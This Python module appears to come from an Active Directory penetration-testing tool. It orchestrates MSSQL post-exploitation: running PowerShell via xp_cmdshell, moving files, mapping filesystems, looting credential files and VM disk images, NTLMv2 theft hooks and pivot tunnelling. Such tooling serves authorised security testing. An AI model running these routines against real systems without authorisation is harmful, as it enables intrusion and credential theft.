"""CLI orchestration for MSSQL operations.

This module keeps interactive CLI concerns (printing, follow-up prompts) outside
of the giant `adscan.py`, while delegating execution logic to the service layer.
"""

from __future__ import annotations

from collections.abc import Callable
from dataclasses import dataclass
from datetime import datetime, timezone
import json
import os
import re
import subprocess
import time
from typing import Any, Protocol

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_operation_header,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.integrations.mssql import (
    ImpacketMSSQLBackend,
    XpCmdshellStatus,
    is_hash_authentication,
    parse_xp_cmdshell_enable_failure_reason,
    print_mssql_sweep_card,
)
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.exploitation import ExploitationService
from adscan_internal.services.exploitation.remote_windows_execution import (
    RemoteWindowsAuth,
    RemoteWindowsExecutionService,
)
from adscan_internal.services.ai_backend_availability_service import (
    AIBackendAvailabilityService,
)
from adscan_internal.services.pivot_opportunity_service import (
    ensure_host_bound_workflow_target_viable,
)
from adscan_internal.services.pivot_reachability_candidate_service import (
    collect_pivot_reachability_candidates,
)
from adscan_internal.services.pivot_service import orchestrate_ligolo_pivot_tunnel
from adscan_internal.services.post_pivot_followup_service import (
    PivotExecutionContext,
    maybe_offer_post_pivot_owned_followup,
    maybe_offer_post_pivot_trust_followup_from_targets,
    refresh_network_inventory_after_pivot,
    render_post_pivot_reachability_delta,
)
from adscan_internal.services.smb_sensitive_file_policy import (
    SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
    get_production_sensitive_scan_phase_sequence,
    get_sensitive_file_extensions,
    get_sensitive_phase_definition,
    get_sensitive_phase_extensions,
)
from adscan_internal.services.windows_file_mapping_service import (
    WindowsFileMapEntry,
    WindowsFileMappingError,
    WindowsFileMappingService,
    WindowsPowerShellExecutionResult,
)
from adscan_internal.services.windows_sensitive_scan_policy_service import (
    WindowsSensitiveScanPolicyService,
)
from adscan_internal.services.windows_artifact_acquisition_service import (
    WindowsArtifactAcquisitionResult,
    WindowsArtifactAcquisitionService,
    format_fetch_path_preview,
    summarize_fetch_skip_reasons,
)
from adscan_internal.services.windows_sensitive_phase_execution_service import (
    WindowsSensitivePhaseExecutionService,
)
from adscan_internal.services.windows_ai_sensitive_analysis_service import (
    WindowsAISensitiveAnalysisService,
)
from adscan_internal.text_utils import strip_ansi_codes
from rich.markup import escape as rich_escape
from rich.prompt import Confirm
from rich.table import Table
from adscan_core.output._panels import print_panel
from adscan_core.theme import (
    BOX_ROUNDED as _BOX_ROUNDED,
    COLOR_AMBER as _COLOR_AMBER,
    COLOR_CRIMSON as _COLOR_CRIMSON,
    COLOR_MUTED as _COLOR_MUTED,
    COLOR_STEEL as _COLOR_STEEL,
)
from rich.text import Text as RichText


class MssqlShell(Protocol):
    """Minimal shell surface used by MSSQL CLI controller."""

    netexec_path: str | None
    myip: str | None
    domains_data: dict
    domains_dir: str
    current_workspace_dir: str | None

    def _run_netexec(
        self,
        command: str,
        *,
        domain: str | None = None,
        timeout: int | None = None,
        **kwargs,
    ) -> subprocess.CompletedProcess[str] | None: ...

    def _get_lab_slug(self) -> str | None: ...

    def _get_service_executor(
        self,
    ) -> Callable[[str, int], subprocess.CompletedProcess[str]]: ...

    def run_command(
        self, command: str, *, timeout: int | None = None, **kwargs
    ) -> subprocess.CompletedProcess[str] | None: ...

    def ask_for_dump_host(
        self, domain: str, host: str, username: str, password: str, islocal: str
    ) -> None: ...

    def ask_for_mssql_impersonate(
        self, domain: str, host: str, username: str, password: str
    ) -> None: ...

    def mssql_steal_ntlmv2(
        self, domain: str, host: str, username: str, password: str, islocal: str
    ) -> None: ...

    def mssql_impersonate(
        self, domain: str, host: str, username: str, password: str
    ) -> None: ...

    def _get_workspace_cwd(self) -> str: ...


@dataclass(frozen=True, slots=True)
class MssqlExecutionPath:
    """Describe one MSSQL-backed remote execution path."""

    mode: str
    linked_server: str | None = None
    identity: str | None = None


def _execute_powershell_via_mssql(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
    script: str,
    operation_name: str | None = None,
) -> str:
    """Execute PowerShell over MSSQL command execution and return stdout."""
    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    result = remote_executor.execute_powershell(
        auth,
        script,
        operation_name=operation_name or "mssql_powershell",
        preferred_transport="mssql",
        timeout=300,
    )
    if not result.success and not result.stdout:
        raise RuntimeError(
            result.error_message
            or result.stderr
            or "MSSQL PowerShell execution failed."
        )
    if result.stderr:
        _stderr_preview = str(result.stderr or "").strip()[:400]
        print_info_debug(
            f"[mssql] {operation_name or 'powershell'} stderr ({len(str(result.stderr or ''))} chars): "
            f"{_stderr_preview!r}"
        )
    return _normalize_mssql_powershell_stdout(str(result.stdout or ""))


def _normalize_mssql_powershell_stdout(stdout: str) -> str:
    """Normalize MSSQL PowerShell stdout by removing wrapper noise like ``NULL`` lines."""
    normalized_lines = [
        line.rstrip()
        for line in str(stdout or "").splitlines()
        if line.strip() and line.strip().upper() != "NULL"
    ]
    return "\n".join(normalized_lines).strip()


def _load_mssql_json_stdout(stdout: str) -> Any:
    """Decode one JSON payload from MSSQL PowerShell stdout with trailing wrapper lines removed.

    xp_cmdshell truncates each output row at 255 characters, which can split a long
    JSON string across multiple rows.  We therefore also attempt to parse the lines
    joined without any separator so that mid-string truncations are reconstructed.
    """
    normalized = _normalize_mssql_powershell_stdout(stdout)
    if not normalized:
        return {}
    lines = normalized.splitlines()
    # Fast path: single line or last line is a self-contained JSON object/array.
    for candidate in reversed(lines):
        stripped = candidate.strip()
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                return json.loads(stripped)
            except json.JSONDecodeError:
                break  # truncated — fall through to concatenation attempt
    # xp_cmdshell may have split the JSON across 255-char rows; join without separator.
    concatenated = "".join(line.rstrip() for line in lines)
    if concatenated.startswith("{") or concatenated.startswith("["):
        return json.loads(concatenated)
    return json.loads(normalized)


def _build_mssql_windows_architecture_script() -> str:
    """Return a PowerShell script that detects remote Windows architecture."""
    from adscan_internal.cli.winrm import _build_winrm_windows_architecture_script

    return _build_winrm_windows_architecture_script()


def detect_mssql_windows_architecture(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
) -> str | None:
    """Detect remote Windows architecture through MSSQL command execution."""
    output = _execute_powershell_via_mssql(
        shell=shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        execution_path=execution_path,
        script=_build_mssql_windows_architecture_script(),
        operation_name="windows_architecture_detect",
    )
    payload = _load_mssql_json_stdout(output)
    if not isinstance(payload, dict):
        return None
    normalized_arch = str(payload.get("architecture") or "").strip().lower()
    if not normalized_arch or normalized_arch == "unknown":
        return None
    return normalized_arch


def mssql_upload(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
    local_path: str,
    remote_path: str,
) -> bool:
    """Upload a file to the remote host through MSSQL-backed execution."""
    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    result = remote_executor.upload_file(
        auth,
        local_path=local_path,
        remote_path=remote_path,
        preferred_transport="mssql",
        timeout=300,
    )
    if not result.success:
        print_warning(
            f"MSSQL upload failed for {mark_sensitive(remote_path, 'path')}: "
            f"{mark_sensitive(result.error_message or 'unknown error', 'detail')}"
        )
        return False
    print_success(f"MSSQL upload completed: {mark_sensitive(remote_path, 'path')}")
    return True


def _build_mssql_network_inventory_script() -> str:
    """Return the shared pivot inventory script for MSSQL execution."""
    from adscan_internal.cli.winrm import _build_winrm_network_inventory_script

    return _build_winrm_network_inventory_script()


def _convert_subnet_mask_to_prefix_length(mask: str) -> int | None:
    """Convert one dotted IPv4 subnet mask into a prefix length."""
    octets = str(mask or "").strip().split(".")
    if len(octets) != 4 or any(not octet.isdigit() for octet in octets):
        return None
    return sum(bin(int(octet)).count("1") for octet in octets)


def _parse_mssql_ipconfig_interfaces(stdout: str) -> list[dict[str, Any]]:
    """Parse IPv4 interfaces from one ipconfig output."""
    interfaces: list[dict[str, Any]] = []
    current_interface = ""
    pending_ipv4: str | None = None
    for raw_line in str(stdout or "").splitlines():
        line = raw_line.rstrip()
        stripped = line.strip()
        if not stripped:
            continue
        if not raw_line.startswith((" ", "\t")) and stripped.endswith(":"):
            current_interface = stripped[:-1].strip()
            pending_ipv4 = None
            continue
        ip_match = re.search(
            r"IPv4 Address[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line
        )
        if ip_match:
            pending_ipv4 = ip_match.group(1)
            continue
        mask_match = re.search(
            r"Subnet Mask[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line
        )
        if pending_ipv4 and mask_match:
            prefix_length = _convert_subnet_mask_to_prefix_length(mask_match.group(1))
            if pending_ipv4 != "127.0.0.1" and not pending_ipv4.startswith("169.254."):
                interfaces.append(
                    {
                        "IPAddress": pending_ipv4,
                        "PrefixLength": prefix_length,
                        "InterfaceAlias": current_interface,
                    }
                )
            pending_ipv4 = None
    return interfaces


def _parse_mssql_route_print(
    stdout: str, interfaces: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    """Parse IPv4 routes from one ``route print -4`` output."""
    interface_alias_by_ip = {
        str(entry.get("IPAddress") or "").strip(): str(
            entry.get("InterfaceAlias") or ""
        ).strip()
        for entry in interfaces
        if str(entry.get("IPAddress") or "").strip()
    }
    routes: list[dict[str, Any]] = []
    active_routes = False
    route_pattern = re.compile(
        r"^\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+"
        r"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+"
        r"(\S+)\s+"
        r"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+"
        r"([0-9]+)\s*$"
    )
    for line in str(stdout or "").splitlines():
        if re.match(r"^\s*Active Routes:\s*$", line):
            active_routes = True
            continue
        if not active_routes:
            continue
        if re.match(r"^\s*(Persistent Routes:|====)", line):
            break
        if re.match(
            r"^\s*Network Destination\s+Netmask\s+Gateway\s+Interface\s+Metric\s*$",
            line,
        ):
            continue
        match = route_pattern.match(line)
        if not match:
            continue
        destination, mask, gateway, interface_ip, metric_text = match.groups()
        prefix_length = _convert_subnet_mask_to_prefix_length(mask)
        if prefix_length is None:
            continue
        alias = interface_alias_by_ip.get(interface_ip) or interface_ip
        routes.append(
            {
                "DestinationPrefix": f"{destination}/{prefix_length}",
                "NextHop": gateway,
                "InterfaceAlias": alias,
                "RouteMetric": int(metric_text),
            }
        )
    return routes


def _collect_mssql_network_inventory(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
) -> dict[str, Any]:
    """Collect IPv4 interfaces/routes over MSSQL using short inline commands."""
    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    ipconfig_result = remote_executor.execute_command(
        auth,
        "ipconfig",
        operation_name="pivot_ipconfig",
        preferred_transport="mssql",
        timeout=180,
    )
    if not ipconfig_result.success:
        raise RuntimeError(
            ipconfig_result.error_message or "MSSQL ipconfig execution failed."
        )
    route_result = remote_executor.execute_command(
        auth,
        "route print -4",
        operation_name="pivot_route_print",
        preferred_transport="mssql",
        timeout=180,
    )
    if not route_result.success:
        raise RuntimeError(
            route_result.error_message or "MSSQL route print execution failed."
        )
    interfaces = _parse_mssql_ipconfig_interfaces(ipconfig_result.stdout)
    routes = _parse_mssql_route_print(route_result.stdout, interfaces)
    return {
        "interfaces": interfaces,
        "routes": routes,
        "interface_source": "ipconfig",
        "route_source": "route print -4",
    }


def _build_mssql_pivot_probe_script(targets: list[Any]) -> str:
    """Return the shared pivot probe script for MSSQL execution."""
    from adscan_internal.cli.winrm import _build_winrm_pivot_probe_script

    return _build_winrm_pivot_probe_script(targets)


def _select_mssql_pivot_targets(
    *,
    payload: dict[str, Any] | None = None,
    candidate_entries: list[dict[str, Any]] | None = None,
    remote_interfaces: list[dict[str, Any]],
    remote_routes: list[dict[str, Any]],
    max_targets: int = 25,
) -> list[Any]:
    """Reuse the WinRM target selector for MSSQL-based pivot checks."""
    from adscan_internal.cli.winrm import _select_winrm_pivot_targets

    return _select_winrm_pivot_targets(
        payload=payload,
        candidate_entries=candidate_entries,
        remote_interfaces=remote_interfaces,
        remote_routes=remote_routes,
        max_targets=max_targets,
    )


def _persist_mssql_pivot_reachability_report(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    payload: dict[str, Any],
) -> str | None:
    """Persist one MSSQL pivot reachability report under the host workspace."""
    report_path = os.path.join(
        shell.current_workspace_dir or "",
        shell.domains_dir,
        domain,
        "mssql",
        f"{host}_pivot_reachability_report.json",
    )
    try:
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        with open(report_path, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, sort_keys=False)
            handle.write("\n")
    except OSError:
        return None
    return report_path


def _summarize_mssql_pivot_inventory(
    entries: list[dict[str, Any]],
    *,
    route_mode: bool = False,
) -> str:
    """Return a short debug summary for MSSQL pivot inventory entries."""
    from adscan_internal.cli.winrm import _summarize_winrm_pivot_inventory

    return _summarize_winrm_pivot_inventory(entries, route_mode=route_mode)


def _get_workspace_dir(shell: MssqlShell) -> str:
    """Return the active workspace directory for persisted MSSQL artifacts."""
    resolver = getattr(shell, "_get_workspace_cwd", None)
    if callable(resolver):
        return str(resolver())
    return str(getattr(shell, "current_workspace_dir", "") or os.getcwd())


def _is_ctf_domain_pwned(shell: MssqlShell, domain: str) -> bool:
    """Return whether the current CTF domain is already marked as pwned."""
    if str(getattr(shell, "type", "") or "").strip().lower() != "ctf":
        return False
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return False
    domain_record = domains_data.get(domain) or {}
    if not isinstance(domain_record, dict):
        return False
    return str(domain_record.get("auth", "") or "").strip().lower() == "pwned"


def _persist_mssql_linked_servers(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    linked_servers: list[str],
) -> str:
    """Persist linked-server findings for later cross-domain correlation."""
    workspace_dir = _get_workspace_dir(shell)
    output_dir = os.path.join(workspace_dir, shell.domains_dir, domain, "mssql")
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(
        output_dir,
        f"linked_servers.{host}.{username}.json".replace("\\", "_").replace("/", "_"),
    )
    payload = {
        "domain": domain,
        "host": host,
        "username": username,
        "linked_servers": linked_servers,
    }
    with open(output_path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2, ensure_ascii=True)
    return output_path


def _fetch_mssql_phase_files(
    shell: MssqlShell,
    *,
    remote_executor: RemoteWindowsExecutionService,
    auth: RemoteWindowsAuth,
    selected_entries: list[WindowsFileMapEntry],
    loot_dir: str,
) -> WindowsArtifactAcquisitionResult:
    """Fetch one MSSQL-backed phase using the shared acquisition service."""
    file_targets = [
        (
            entry.full_name,
            WindowsFileMappingService.build_local_relative_path(entry.full_name),
        )
        for entry in selected_entries
        if entry.full_name
    ]
    result = WindowsArtifactAcquisitionService().acquire_files(
        file_targets=file_targets,
        download_dir=loot_dir,
        workspace_type=str(getattr(shell, "type", "") or "").strip().lower() or None,
        file_fetcher=lambda remote_path, save_path: _download_mssql_target(
            remote_executor=remote_executor,
            auth=auth,
            remote_path=remote_path,
            local_path=save_path,
        ),
    )
    if result.per_file_failures:
        failure_summary = summarize_fetch_skip_reasons(list(result.per_file_failures))
        print_warning(
            "MSSQL per-file fetch skipped inaccessible files but continued: "
            f"downloaded={len(result.downloaded_files)} failed={len(list(result.per_file_failures))} "
            f"access_denied={failure_summary['access_denied']} "
            f"file_in_use={failure_summary['file_in_use']} "
            f"other={failure_summary['other']} "
            # Escape the literal '[' (\\[) and rich-escape the joined path
            # preview so a forward-slash / UNC fetch path is not parsed as a
            # Rich closing tag (MarkupError). Same pattern as scan_outcome_flow.
            f"preview=\\[{rich_escape(format_fetch_path_preview(items=list(result.per_file_failures)))}]"
        )
    return result


def _run_mssql_ai_sensitive_data_scan(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    entries: list[WindowsFileMapEntry],
    run_root_abs: str,
    execution_path: MssqlExecutionPath,
) -> dict[str, object]:
    """Run AI-assisted sensitive-data analysis over a cached MSSQL manifest."""
    from adscan_internal.cli.smb import (
        _handle_prioritized_findings_actions,
        _render_file_credentials_table,
    )

    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    return (
        WindowsAISensitiveAnalysisService()
        .execute(
            shell,
            domain=domain,
            host=host,
            username=username,
            entries=entries,
            run_root_abs=run_root_abs,
            workflow_label="MSSQL",
            source_share="mssql",
            artifact_transport_folder="mssql",
            select_scope=lambda current_shell: (
                WindowsSensitiveScanPolicyService().select_ai_triage_scope(
                    shell=current_shell
                )
            ),
            should_inspect_prioritized_files=lambda current_shell: (
                WindowsSensitiveScanPolicyService().should_inspect_ai_prioritized_files(
                    shell=current_shell,
                    workflow_label="MSSQL",
                )
            ),
            should_continue_after_findings=lambda current_shell, current_domain: (
                WindowsSensitiveScanPolicyService().should_continue_after_ai_findings(
                    shell=current_shell,
                    domain=current_domain,
                    workflow_label="MSSQL",
                    skip_for_pwned_ctf=_is_ctf_domain_pwned(
                        current_shell, current_domain
                    ),
                )
            ),
            skip_for_pwned_ctf=_is_ctf_domain_pwned,
            fetch_selected_entries=lambda selected_entries, loot_dir: (
                _fetch_mssql_phase_files(
                    shell,
                    remote_executor=remote_executor,
                    auth=auth,
                    selected_entries=selected_entries,
                    loot_dir=loot_dir,
                )
            ),
            render_findings_table=lambda current_shell, candidate, findings, source_label: (
                _render_file_credentials_table(
                    current_shell,
                    candidate=candidate,
                    findings=findings,
                    source_label=source_label,
                )
            ),
            handle_findings_actions=_handle_prioritized_findings_actions,
        )
        .to_dict()
    )


def _download_mssql_target(
    *,
    remote_executor: RemoteWindowsExecutionService,
    auth: RemoteWindowsAuth,
    remote_path: str,
    local_path: str,
) -> str:
    """Download one remote file via MSSQL or raise a descriptive error."""
    result = remote_executor.download_file(
        auth,
        remote_path=remote_path,
        local_path=local_path,
        preferred_transport="mssql",
        timeout=300,
    )
    if not result.success:
        raise RuntimeError(result.error_message or "MSSQL file download failed.")
    return str(result.local_path or local_path)


def _run_mssql_filesystem_mapping(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
) -> dict[str, object]:
    """Generate a deterministic filesystem manifest and run shared local analysis via MSSQL."""
    availability = AIBackendAvailabilityService().get_availability()
    mode = WindowsSensitiveScanPolicyService().select_analysis_mode(
        shell=shell,
        ai_configured=availability.configured,
        workflow_label="MSSQL",
    )
    if mode == "skip":
        print_info("MSSQL sensitive-data analysis skipped by user.")
        return {"completed": False, "skipped": True}

    workspace_dir = _get_workspace_dir(shell)
    cache_key = WindowsFileMappingService.build_cache_key(
        host=host,
        username=username,
        root_strategy=execution_path.mode,
    )
    output_path = os.path.join(
        workspace_dir,
        shell.domains_dir,
        domain,
        "mssql",
        "sensitive",
        cache_key,
        "file_tree_map.json",
    )
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    mapping_service = WindowsFileMappingService()

    # ── Mapping cache check ───────────────────────────────────────────────────
    from adscan_internal.services.windows_loot_cache_service import try_use_mapping_cache

    workspace_type_mssql = str(getattr(shell, "type", "") or "").strip().lower()

    def _mssql_loader() -> "tuple[int, dict] | None":
        data = mapping_service.load_file_map(input_path=output_path)
        entries = list(data.get("entries") or [])
        if not entries:
            return None
        return len(entries), data

    mapping_result: dict[str, object] | None = try_use_mapping_cache(
        shell,
        manifest_path=output_path,
        workspace_type=workspace_type_mssql,
        transport_label="MSSQL",
        loader=_mssql_loader,
    )
    if mapping_result is not None:
        print_info(
            "Using cached MSSQL filesystem mapping from "
            f"{mark_sensitive(output_path, 'path')} "
            f"({len(list(mapping_result.get('entries') or []))} file entries)."
        )

    if mapping_result is None:
        def _executor(script: str) -> WindowsPowerShellExecutionResult:
            result = remote_executor.execute_powershell(
                auth,
                script,
                operation_name="mssql_sensitive_file_map",
                preferred_transport="mssql",
                timeout=300,
            )
            return WindowsPowerShellExecutionResult(
                stdout=result.stdout,
                stderr=result.stderr or (result.error_message or ""),
                had_errors=not result.success,
            )

        started_at = time.perf_counter()
        try:
            mapping_result = mapping_service.generate_file_map(
                command_executor=_executor,
                output_path=output_path,
                metadata={
                    "transport": "mssql",
                    "execution_mode": execution_path.mode,
                    "linked_server": execution_path.linked_server,
                    "identity": execution_path.identity,
                },
            )
        except WindowsFileMappingError as exc:
            telemetry.capture_exception(exc)
            print_error(f"MSSQL filesystem mapping failed: {exc}")
            return {"completed": False, "error": str(exc)}

        duration = time.perf_counter() - started_at
        print_success(
            "Deterministic MSSQL filesystem mapping prepared at "
            f"{mark_sensitive(output_path, 'path')} with "
            f"{len(list(mapping_result.get('entries') or []))} file entries "
            f"in {duration:.2f}s."
        )

    entries: list[object] = list((mapping_result or {}).get("entries") or [])
    run_root_abs = os.path.join(os.path.dirname(output_path), "phases")
    os.makedirs(run_root_abs, exist_ok=True)
    if mode == "ai":
        return _run_mssql_ai_sensitive_data_scan(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            entries=entries,
            run_root_abs=run_root_abs,
            execution_path=execution_path,
        )
    from adscan_internal.services.smb_sensitive_phase_orchestration_service import (
        select_sensitive_scan_phases,
    )

    selected_phases = select_sensitive_scan_phases(
        shell, domain=domain, transport_label="MSSQL"
    )
    if not selected_phases:
        print_info("No MSSQL credential-hunt phases selected — skipping analysis.")
        return {
            "completed": True,
            "output_path": output_path,
            "entry_count": len(entries),
            "phases_run": [],
        }

    phase_sequence = get_production_sensitive_scan_phase_sequence()
    results: list[dict[str, object]] = []
    auth_for_fetch = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )

    def _run_phase(phase: str) -> dict[str, object]:
        phase_definition = get_sensitive_phase_definition(phase)
        phase_label = str(phase_definition.get("label", phase) or phase)
        if phase in {
            SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
        }:
            phase_extensions = get_sensitive_file_extensions(
                str(phase_definition.get("profile", ""))
            )
        else:
            phase_extensions = get_sensitive_phase_extensions(phase)
        selected_entries = WindowsFileMappingService.select_entries_by_extensions(
            entries=entries,
            extensions=phase_extensions,
        )
        phase_root_abs = os.path.join(run_root_abs, phase)
        loot_dir = os.path.join(phase_root_abs, "loot")
        loot_meta_path = os.path.join(phase_root_abs, "loot_meta.json")
        os.makedirs(loot_dir, exist_ok=True)
        print_info(
            "Running deterministic MSSQL analysis "
            f"({mark_sensitive(phase_label, 'text')}) on "
            f"{mark_sensitive(host, 'hostname')}."
        )
        from adscan_internal.services.windows_loot_cache_service import (
            decide_loot_cache_reuse,
            make_cached_loot_fetcher,
            write_loot_cache_metadata,
        )

        workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
        if decide_loot_cache_reuse(
            shell,
            loot_dir=loot_dir,
            meta_path=loot_meta_path,
            phase_label=phase_label,
            workspace_type=workspace_type,
            transport_label="MSSQL",
        ):
            phase_fetcher = make_cached_loot_fetcher(loot_dir)
        else:
            _loot_meta_path = loot_meta_path

            def phase_fetcher(  # type: ignore[misc]
                _lmpath=_loot_meta_path,
            ):
                result = _fetch_mssql_phase_files(
                    shell,
                    remote_executor=remote_executor,
                    auth=auth_for_fetch,
                    selected_entries=selected_entries,
                    loot_dir=loot_dir,
                )
                write_loot_cache_metadata(
                    _lmpath,
                    file_count=len(list(result.downloaded_files)),
                    host=host,
                    username=username,
                    phase=phase,
                    transport="mssql",
                )
                return result

        return (
            WindowsSensitivePhaseExecutionService()
            .execute_phase(
                shell,
                domain=domain,
                host=host,
                username=username,
                phase=phase,
                phase_label=phase_label,
                phase_root_abs=phase_root_abs,
                loot_dir=loot_dir,
                selected_entries_count=len(selected_entries),
                phase_excluded_total=0,
                fetcher=phase_fetcher,
                source_share="mssql",
                source_artifact="mssql deterministic file scan",
                transport_label="MSSQL",
            )
            .to_dict()
        )

    for phase in phase_sequence:
        if phase not in selected_phases:
            continue
        results.append(_run_phase(phase))

    # VM disk artifacts (.vhd/.vmdk/...) are not in any byte-phase extension set, so
    # the loop above never sees them. Discover them from the MSSQL filesystem map
    # and extract credentials offline via a native SMB sparse read (the read needs
    # SMB/445 to the host — MSSQL is the discovery transport, not the read one).
    _run_mssql_vm_disk_scan(
        shell, domain=domain, host=host, entries=entries,
        username=username, password=password,
    )

    loot_root_rel = os.path.relpath(run_root_abs, _get_workspace_dir(shell))
    print_info(
        "Deterministic MSSQL analysis completed. "
        f"Loot root: {mark_sensitive(loot_root_rel, 'path')}."
    )

    return {
        "completed": True,
        "output_path": output_path,
        "entry_count": len(entries),
        "phases_run": results,
    }


def _run_mssql_vm_disk_scan(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    entries: list[object],
    username: str,
    password: str,
) -> int:
    """Extract credentials from VM disk artifacts found in the MSSQL filesystem map.

    MSSQL (``xp_dirtree``-style mapping) is the DISCOVERY transport; the disk image
    is read over native SMB (sparse, single persistent session) — so this needs
    SMB/445 reachable to ``host``. Absolute ``C:\\`` paths from the map are
    translated to an SMB admin share. DC snapshots route through the DCSync selector,
    member-server snapshots through host-scoped local persistence. Best-effort:
    never aborts the surrounding scan.
    """
    try:
        from adscan_internal.cli.vm_artifact_credentials import (
            persist_vm_disk_credentials,
        )
        from adscan_internal.services.vm_artifact_service import (
            VMArtifactService,
            classify_vm_artifact,
            windows_path_to_admin_share,
        )

        vm_entries = [
            (entry, classify_vm_artifact(str(getattr(entry, "full_name", "") or "")))
            for entry in entries
        ]
        vm_entries = [(e, k) for (e, k) in vm_entries if k in ("disk", "memory")]
        if not vm_entries:
            return 0
        print_info(
            f"VM artifact scan: found {len(vm_entries)} VM disk/memory artifact(s) in "
            "the MSSQL filesystem map — extracting credentials offline (disk: sparse "
            "SMB read; memory: download + Volatility 3)."
        )
        service = VMArtifactService()
        stored_total = 0
        for entry, kind in vm_entries:
            full_name = str(getattr(entry, "full_name", "") or "")
            vm_share, vm_relpath = windows_path_to_admin_share(full_name)
            if kind == "memory":
                extraction = service.extract_from_smb_memory(
                    shell=shell,
                    domain=domain,
                    host=host,
                    share=vm_share or "C$",
                    source_path=vm_relpath or full_name,
                    auth_username=username,
                    auth_password=password,
                )
            else:
                size = int(getattr(entry, "length", 0) or 0)
                extraction = service.extract_from_smb_disk(
                    shell=shell,
                    domain=domain,
                    host=host,
                    share=vm_share or "C$",
                    source_path=vm_relpath or full_name,
                    size=size or None,  # None -> resolved via native aiosmb stat
                    auth_username=username,
                    auth_password=password,
                )
            persist_result = persist_vm_disk_credentials(
                shell,
                domain=domain,
                host=host,
                source_label=full_name,
                extraction=extraction,
            )
            stored_total += int(getattr(persist_result, "stored", 0) or 0)
        return stored_total
    except Exception as exc:  # noqa: BLE001 - VM disk scan must never abort the MSSQL scan
        telemetry.capture_exception(exc)
        print_info_debug(f"MSSQL VM disk artifact scan failed (non-fatal): {exc}")
        return 0


def check_pivot_reachability_via_mssql(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
    offer_post_pivot_owned_followup: bool = True,
) -> None:
    """Check whether an MSSQL-execution host can reach IPs hidden from the original vantage."""
    from adscan_internal.cli.winrm import _load_workspace_network_reachability_report

    reachability_payload = _load_workspace_network_reachability_report(
        shell, domain=domain
    )
    if not reachability_payload:
        print_info_debug(
            "Skipping MSSQL pivot reachability check: no current-vantage reachability report is available."
        )
        return
    ip_entries = reachability_payload.get("ips", [])
    if not isinstance(ip_entries, list):
        print_info_debug(
            "Skipping MSSQL pivot reachability check: reachability report has no usable IP entries."
        )
        return
    candidate_entries, candidate_counts, _ = collect_pivot_reachability_candidates(
        source_domain=domain,
        payload=reachability_payload,
        domain_connectivity=getattr(shell, "domain_connectivity", {}) or {},
        domains_data=getattr(shell, "domains_data", {}) or {},
    )
    if candidate_counts["total_count"] == 0:
        print_info(
            "Skipping MSSQL pivot probing because there are no hidden current-vantage, "
            "service-hidden, or trusted-domain targets left to validate."
        )
        print_info_debug(
            "Skipping MSSQL pivot reachability check: no host-level hidden targets, "
            "service-hidden targets, or inter-domain trust targets exist."
        )
        return

    try:
        print_operation_header(
            "MSSQL Pivot Reachability Check",
            details={
                "Domain": domain,
                "Pivot Host": host,
                "Username": username,
                "Host Hidden IPs": str(candidate_counts["host_hidden_count"]),
                "Service Hidden IPs": str(candidate_counts["service_hidden_count"]),
                "Trusted-Domain Targets": str(candidate_counts["trusted_domain_count"]),
                "Protocol": execution_path.mode,
            },
            icon="🧭",
        )
        print_info(
            "Assessing whether this MSSQL execution path can reach hidden hosts, service-hidden "
            "targets, and unresolved trusted-domain controllers."
        )
